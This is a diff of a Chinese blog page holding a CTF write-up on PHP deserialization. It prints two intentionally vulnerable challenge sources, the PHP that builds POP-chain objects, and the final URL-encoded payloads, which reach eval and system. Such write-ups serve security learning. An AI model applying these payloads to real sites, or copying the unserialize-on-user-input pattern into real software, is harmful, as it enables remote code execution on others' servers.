@@ -23,14 +23,14 @@
 <meta property="og:site_name" content="Double--R blog">
 <meta property="og:description" content="因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/bizhi/1524793388.68.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/16.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test1.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test2.jpg">
-<meta property="og:updated_time" content="2018-05-20T03:21:59.574Z">
+<meta property="og:updated_time" content="2018-07-21T05:26:15.614Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php反序列化组会例题和makerctf easy_unserialize的wp">
 <meta name="twitter:description" content="因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/bizhi/1524793388.68.jpg">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/16.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -78,7 +78,7 @@
         isCategory: false,
         fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
         scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
-        search: 
+        search: false
     }
 </script>
 
@@ -102,7 +102,7 @@
 <div class="intrude-less">
     <header id="header" class="inner">
         <a href="/" class="profilepic">
-            <img src="/img/avatar.png" class="animated zoomIn">
+            <img src="/img/timg.jpg" class="animated zoomIn">
         </a>
         <hgroup>
           <h1 class="header-author"><a href="/">Double--R</a></h1>
@@ -176,11 +176,13 @@
                     <nav class="header-nav">
                         <ul class="social">
                             
-                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                                <a class="fa Email" href="/1036460042@qq.com" title="Email"></a>
                             
-                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                                <a class="fa GitHub" href="https://github.com/doubler12138" title="GitHub"></a>
                             
                                 <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="/1036460042" title="QQ"></a>
                             
                         </ul>
                     </nav>
@@ -189,7 +191,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-WriteUp/">CTF-WriteUp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/学习笔记/">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/总结/">总结</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/组会内容/">组会内容</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/链接/">链接</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/项目/">项目</a></li></ul>
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-WriteUp/">CTF-WriteUp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/学习笔记/">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/总结/">总结</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/组会内容/">组会内容</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/项目/">项目</a></li></ul>
                     </div>
                 </section>
                 
@@ -200,7 +202,21 @@
                     
                       <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
                     
-                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                      <a class="main-nav-link switch-friends-link" href="https://github.com/doubler12138">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://f1sh.site/">Fish</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.k0rz3n.com/">K0rz3n</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://pupiles.com/">Pupiles</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://ox1234.github.io/">Flight</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://codeqi.top/">Qiqi</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://quincyblog.top/">Quincy</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://blog.void0red.top/">Void0red</a>
                     
                       <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
                     
@@ -212,11 +228,15 @@
                 
                 <section class="switch-part switch-part4">
                 
-                    <div id="js-aboutme">专注于前端</div>
+                    <div id="js-aboutme">菜的真实，只能学习</div>
                 </section>
                 
             </div>
         </div>
+		
+		<div style="position:absolute; bottom:120px left:auto; width:85%">
+			<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=260 height=86 src="//music.163.com/outchain/player?type=2&id=29828423&auto=1&height=66"></iframe>
+		</div>
     </header>                
 </div>
     </div>
@@ -229,7 +249,7 @@
     <div class="intrude-less">
         <header id="header" class="inner">
             <a href="/" class="profilepic">
-                <img src="/img/avatar.png" class="animated zoomIn">
+                <img src="/img/timg.jpg" class="animated zoomIn">
             </a>
             <hgroup>
               <h1 class="header-author"><a href="/" title="回到主页">Double--R</a></h1>
@@ -254,11 +274,13 @@
             <nav class="header-nav">
                         <ul class="social">
                             
-                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                                <a class="fa Email" target="_blank" href="/1036460042@qq.com" title="Email"></a>
                             
-                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                                <a class="fa GitHub" target="_blank" href="https://github.com/doubler12138" title="GitHub"></a>
                             
                                 <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/1036460042" title="QQ"></a>
                             
                         </ul>
             </nav>
@@ -308,24 +330,20 @@
           
         <p><strong>因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。</strong></p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/bizhi/1524793388.68.jpg" alt="Alt text"></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/16.jpg" alt="Alt text"></p>
 <a id="more"></a>
 <p><strong>组会例题：</strong></p>
 <ul>
 <li><p>题目源码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test1</span><br><span class="line">&#123;</span><br><span class="line">   	public $varr;</span><br><span class="line">   	function __construct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $this-&gt;varr = &quot;index.php&quot;;</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __destruct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    if(file_exists($this-&gt;varr))&#123;</span><br><span class="line">   	        echo &quot;&lt;br /&gt;文件&quot;.$this-&gt;varr.&quot;存在&lt;br /&gt;&quot;;</span><br><span class="line">       	&#125;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2</span><br><span class="line">&#123;</span><br><span class="line">   	public $varr;</span><br><span class="line">   	public $obj;</span><br><span class="line">   	function __construct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $this-&gt;varr=&apos;123456&apos;;</span><br><span class="line">   	    $this-&gt;obj=null;</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __toString()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $this-&gt;obj-&gt;execute();</span><br><span class="line">   	    return $this-&gt;varr;</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __destruct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    echo &quot;&lt;br /&gt;这是f2的析构函数&lt;br /&gt;&quot;;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test3</span><br><span class="line">&#123;</span><br><span class="line">    public $varr;</span><br><span class="line">    function execute()</span><br><span class="line">    &#123;</span><br><span class="line">   	    eval($this-&gt;varr);</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __destruct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    echo &quot;&lt;br /&gt;这是f3的析构函数&lt;br /&gt;&quot;;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   	if (isset($_GET[&apos;x&apos;])) &#123;</span><br><span class="line">   	unserialize($_GET[&apos;x&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>目标：打出phpinfo。</p>
-</li>
-<li><p>代码分析：</p>
+<p>   目标：打出phpinfo。</p>
+<p>   代码分析：</p>
 <p>在test3类里有一个execute()函数，函数作用是将公有变量varr的值作为php代码执行。那么我们只要让变量varr的值为”phpinfo();”然后执行execute()函数就行了。但test3只定义了execute()函数，真正调用函数是在test2的<strong>toString函数里面，而且是通过”$this-&gt;obj-&gt;execute()”这样的形似调用的，而obj是test2中的一个变量。所以我们要定义obj为test3对象，这样才能调用test3类中的execute()函数。而test2的</strong>toString()函数被自动调用的条件是test2对象作为字符串使用。在test1类中的<strong>destruct()函数中有一个字符串的点拼接。其中$this-&gt;varr变量被拼接了，那么我们只要定义test1中的varr变量为test2对象，就能调用test2的</strong>toString()函数，就能调用test3的execute()函数，就能执行phpinfo()。</p>
 <p>生成POC的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test1&#123;</span><br><span class="line">	public $varr;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;varr = new test2();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2&#123;</span><br><span class="line">	public $obj;</span><br><span class="line">	public $varr;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;obj= new test3();</span><br><span class="line">		$this-&gt;varr= &apos;123456&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __toString()</span><br><span class="line">   	&#123;</span><br><span class="line">       	$this-&gt;obj-&gt;execute();</span><br><span class="line">       	return $this-&gt;varr;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test3</span><br><span class="line">&#123;</span><br><span class="line">   	public $varr;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;varr = &quot;phpinfo();&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">   	function execute()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    eval($this-&gt;varr);</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;	</span><br><span class="line">$poc = new test1();</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>POC:</p>
+<p>   POC:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A5%3A%22test1%22%3A1%3A%7Bs%3A4%3A%22varr%22%3BO%3A5%3A%22test2%22%3A2%3A%7Bs%3A3%3A%22obj%22%3BO%3A5%3A%22test3%22%3A1%3A%7Bs%3A4%3A%22varr%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7Ds%3A4%3A%22varr%22%3Bs%3A6%3A%22123456%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>结果：</p>
+<p>   结果：</p>
 <p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test1.jpg" alt="Alt text"></p>
 </li>
 </ul>
@@ -333,17 +351,13 @@
 <ul>
 <li><p>题目源码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class gg</span><br><span class="line">&#123;</span><br><span class="line">    private $gg;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;gg-&gt;get1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class start</span><br><span class="line">&#123;</span><br><span class="line">   	private $start1;</span><br><span class="line">   	private $start2;</span><br><span class="line">   	public function get1()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $s1 = $this-&gt;start1;</span><br><span class="line">   	    $s2 = $this-&gt;start2;</span><br><span class="line">   	    $s1($s2);</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    private $name = &quot;蛋黄&quot;;</span><br><span class="line">    private $color = &quot;橘色&quot;;</span><br><span class="line">    private $weight = &quot;5公斤&quot;;</span><br><span class="line"></span><br><span class="line">    public function getName()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getColor()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   	public function getWeight()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    return $this-&gt;weight;</span><br><span class="line">   	&#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($args)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $args.&quot;不是函数&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2</span><br><span class="line">&#123;</span><br><span class="line">    private $a;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class flag</span><br><span class="line">&#123;</span><br><span class="line">    public function getFlag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&apos;cat ../flag.txt&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$x = $_GET[&apos;x&apos;];</span><br><span class="line">if (isset($x)) &#123;</span><br><span class="line">    unserialize($x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>代码分析：</p>
+<p>   代码分析：</p>
 <p>flag类里面有一个getFlag函数，作用是包含一个本地文件，内有flag。定义a为flag对象就可以在test2的<strong>toString()函数中调用getFlag()函数。在cat类中有</strong>invoke($args)函数做字符串的点拼接，定义$args为test2对象就可以在调用<strong>toString()函数。当对象以函数的形式调用时，</strong>invoke()函数自动调用。在start类中有get1函数，里面有$s1($s2)形式，当$s1为cat对象，$s2为test2对象时，调用<strong>invoke()和</strong>toString()。当gg类中的gg变量为start对象，就能调用get1函数。</p>
-</li>
-<li><p>生成POC的代码：</p>
+<p>   生成POC的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class gg</span><br><span class="line">&#123;</span><br><span class="line">    private $gg;</span><br><span class="line"></span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;gg = new start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class start</span><br><span class="line">&#123;</span><br><span class="line">    private $start1;</span><br><span class="line">    private $start2;</span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;start1 = new cat();</span><br><span class="line">		$this-&gt;start2 = new test2();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    public function __invoke($args)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $args.&quot;不是函数&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2</span><br><span class="line">&#123;</span><br><span class="line">    private $a;</span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;a = new flag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class flag</span><br><span class="line">&#123;</span><br><span class="line">    public function getFlag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&apos;cat ../flag.txt&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$poc = new gg();</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>POC:</p>
+<p>   POC:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A2%3A%22gg%22%3A1%3A%7Bs%3A6%3A%22%00gg%00gg%22%3BO%3A5%3A%22start%22%3A2%3A%7Bs%3A13%3A%22%00start%00start1%22%3BO%3A3%3A%22cat%22%3A0%3A%7B%7Ds%3A13%3A%22%00start%00start2%22%3BO%3A5%3A%22test2%22%3A1%3A%7Bs%3A8%3A%22%00test2%00a%22%3BO%3A4%3A%22flag%22%3A0%3A%7B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>结果：</p>
+<p>   结果：</p>
 <p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test2.jpg" alt="Alt text"></p>
 </li>
 </ul>
@@ -358,7 +372,7 @@
         <p><span>本文标题:</span><a href="/2018/05/12/Easy-Unserialize-Writeup/">php反序列化组会例题和makerctf easy_unserialize的wp</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
         <p><span>发布时间:</span>2018-05-12, 22:57:53</p>
-        <p><span>最后更新:</span>2018-05-20, 11:21:59</p>
+        <p><span>最后更新:</span>2018-07-21, 13:26:15</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/05/12/Easy-Unserialize-Writeup/" title="php反序列化组会例题和makerctf easy_unserialize的wp">http://yoursite.com/2018/05/12/Easy-Unserialize-Writeup/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/05/12/Easy-Unserialize-Writeup/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -464,7 +478,7 @@
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/04/22/Links/">常用链接</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/18/2018-15/">2018年大一下学期第15周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/12/Hash-Length-Extension-Attacks/">哈希长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/11/AWD1/">线下AWD模式的学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/10/Crypto-RSA/">RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/10/2018-14/">2018年大一下学期第14周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/2018-13/">2018年大一下学期第13周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/MVC-3/">基于fastphp学习搭建MVC框架（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/MVC-2/">基于fastphp学习搭建MVC框架（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/MVC-1/">基于fastphp学习搭建MVC框架（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/30/SuCTF-Web-Homework/">SUCTF Web题homework 复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/WEB-OS/">命令执行漏洞学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/2018-12/">2018年大一下学期第12周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/BugKu-MISC-WriteUp/">BugKuCTF训练平台MISC题Write-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/24/NanYouCTF-Crypto-WriteUp/">南京邮电大学网络攻防训练平台密码学题Write-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/22/BugKu-Web-Welcome-WriteUp/">BugKuCTF-Web题 Welcome to bugkuctf Write Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/22/NanYouCTF-MISC-WriteUp/">南京邮电大学网络攻防训练平台MISC题Write-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/20/NanYouCTF-Web-WriteUp/">南京邮电大学网络攻防训练平台Web题Write-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/20/2018-11/">2018年大一下学期第11周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/19/Ubuntu-Command/">Ubuntu-Command</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/17/Makerctf-Wp/">MakerCTF Write Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/15/ShiYanBa-EasySqli3/">实验吧CTF-简单的sql注入之3</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/2018-10/">2018年大一下学期第十周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/12/Easy-Unserialize-Writeup/">php反序列化组会例题和makerctf easy_unserialize的wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/PHP-Unseriablize/">php反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/06/2018-9/">2018年大一下学期第9周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/06/XSS2/">XSS学习笔记:反射型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/05/XSS1/">XSS学习笔记:入门篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/02/Webfront4/">Web前端黑客技术揭秘第2章（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/01/2018-8/">2018年大一下学期第8周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/01/ISCC-2018-web6/">ISCC-2018 web题"SQL注入的艺术" write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/30/Webfront3/">Web前端黑客技术揭秘第2章（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/29/Webfront2/">Web前端黑客技术揭秘第2章（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/28/Webfront1/">Web前端黑客技术揭秘第1章</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/27/XueXijiHua/">近期的学习计划</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/27/BugKu-Login3/">BugKuCTF-Login3的Write Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/26/Task/">第十一届全国大学生信息安全竞赛创新实践能力赛在线初赛赛前模拟测试（1/3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/26/RPO-wp/">K0rz3n师傅的RPO题目的wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/24/SQL-3/">SQL学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/23/SQL-2/">SQL学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/22/2018-7/">2018年大一下学期第七周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/22/SQL-1/">SQL注入（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/22/XXE-Injection/">XXE Injection学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/22/Python-Selenium库/">Python Selenium库</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/22/RPO/">RPO漏洞学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/21/Create/">博客创建</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/06/18/2018-15/">2018年大一下学期第15周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/12/Hash-Length-Extension-Attacks/">哈希长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/11/AWD1/">线下AWD模式的学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/10/Crypto-RSA/">RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/10/2018-14/">2018年大一下学期第14周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/2018-13/">2018年大一下学期第13周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/MVC-3/">基于fastphp学习搭建MVC框架（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/MVC-2/">基于fastphp学习搭建MVC框架（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/MVC-1/">基于fastphp学习搭建MVC框架（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/30/SuCTF-Web-Homework/">SUCTF Web题homework 复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/WEB-OS/">命令执行漏洞学习笔记</a></li><li class="post-list-item"><a class="post-list-link" 